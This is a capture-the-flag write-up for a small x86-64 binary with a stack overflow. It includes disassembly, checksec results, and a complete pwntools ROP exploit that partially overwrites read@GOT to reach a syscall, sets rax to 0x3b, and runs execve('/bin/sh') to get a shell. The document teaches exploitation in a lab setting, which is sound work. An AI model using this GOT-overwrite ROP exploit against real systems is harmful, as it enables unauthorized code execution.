This is a small writeup for a nice (and small hehe) challenge.
First of all, let's do a fast reverse of the binary:

```asm
Dump of assembler code for function main:
   0x00000000004004e7 <+0>:	push   rbp
   0x00000000004004e8 <+1>:	mov    rbp,rsp
   0x00000000004004eb <+4>:	sub    rsp,0x40
   0x00000000004004ef <+8>:	lea    rax,[rbp-0x40]
   0x00000000004004f3 <+12>:	mov    edx,0x50f
   0x00000000004004f8 <+17>:	mov    rsi,rax
   0x00000000004004fb <+20>:	mov    edi,0x0
   0x0000000000400500 <+25>:	mov    eax,0x0
   0x0000000000400505 <+30>:	call   0x4003f0 <read@plt>
   0x000000000040050a <+35>:	mov    rax,rax
   0x000000000040050d <+38>:	nop
   0x000000000040050e <+39>:	nop
   0x000000000040050f <+40>:	leave  
   0x0000000000400510 <+41>:	ret    
End of assembler dump.
```

never forget checksec:

```asm
Canary                        : No
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial
```

Partial RelR0, no pie. Nice things but
that's it. And now is the time that you're looking at it, and you're looking at it, and you know that there's a buffer oveflow,but you can't do anything. We have to leak 
some data, aslr is obviously on (2020 it is). It’s almost impossible to exploit a binary only with arbitrary write, is it?

Take your time, and think before you see the solution. 

Time to solve the mystery:

We know that we don’t have the ability to leak address, time to analyze the only function given to us, read().
```asm
   0x7ffff7ec5fa0 <__GI___libc_read>:	    endbr64 
   0x7ffff7ec5fa4 <__GI___libc_read+4>:	  mov    eax,DWORD PTR fs:0x18
   0x7ffff7ec5fac <__GI___libc_read+12>:	test   eax,eax
   0x7ffff7ec5fae <__GI___libc_read+14>:	jne    0x7ffff7ec5fc0 <__GI___libc_read+32>
   0x7ffff7ec5fb0 <__GI___libc_read+16>:	syscall 
   0x7ffff7ec5fb2 <__GI___libc_read+18>:	cmp    rax,0xfffffffffffff000
   0x7ffff7ec5fb8 <__GI___libc_read+24>:	ja     0x7ffff7ec6010 <__GI___libc_read+112>
   0x7ffff7ec5fba <__GI___libc_read+26>:	ret    
   0x7ffff7ec5fbb <__GI___libc_read+27>:	nop    DWORD PTR [rax+rax*1+0x0]
   0x7ffff7ec5fc0 <__GI___libc_read+32>:	sub    rsp,0x28
```


Following the function, we can observe a syscall instruction. This is enough to solve the challenge. Why? 
Because we have a buffer overflow, a bunch of ROPgadgets to control the RDI, RSI and RDX and our beautiful mind to unite all these things together and gain a shell.
In brief, I'll present to you the steps you need to follow to exploit the binary. 

 *  Write /bin/sh somewhere in the .bss section, in order to use it later.
 *  Overwrite last byte of read@GOT address in order to point in the syscall instruction.
 *  Now syscall returns 1 to rax, so next time we call syscall, it'll write some bytes in stdout.
    Controling rdx (0x3b), we want to write 0x3b bytes. RAX's value now is 0x3b (execve's syscall number)
 *  Having RAX equal to 0x3b, /bin/sh in memory, and control of all the necessary registers, it's a matter of time (piece of cake) to get a shell.

Here's the exploit:

```python
from pwn import *

sh = process('./small')

bss = 0x601020
read_got = 0x601018
read_plt = 0x4003f0
start = 0x4004ef
read = 0x4004fb
text = 0x400000


pop_rdi = 0x400583
pop_rsi_r15 = 0x400581
pop_rdx = 0x40059a



#save_bin_sh():
payload = "A"*0x40 + p64(0x0) + p64(pop_rsi_r15) + p64(bss) + p64(0x0) + p64(pop_rdi) + p64(0x0) + p64(pop_rdx) + p64(0x8) + p64(read_plt)


#overwrite_read():
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0x0) + p64(pop_rdx) + p64(0x1) + p64(pop_rdi) + p64(0x0) + p64(read_plt)

#write_0x3b():
payload += p64(pop_rsi_r15) + p64(text) + p64(0x0) + p64(pop_rdx) + p64(0x3b) + p64(pop_rdi) + p64(0x1) + p64(read_plt)

#shell
payload += p64(pop_rdi) + p64(bss) + p64(pop_rdx) + p64(0x0) + p64(pop_rsi_r15) + p64(0x0) + p64(0x0) + p64(read_plt)

pause()
sh.send(payload)
pause()
sh.send("/bin/sh\x00")
pause()
sh.send('\xb0')
sh.interactive()
```

Thanks, fuzzer for this nice and clever chall.
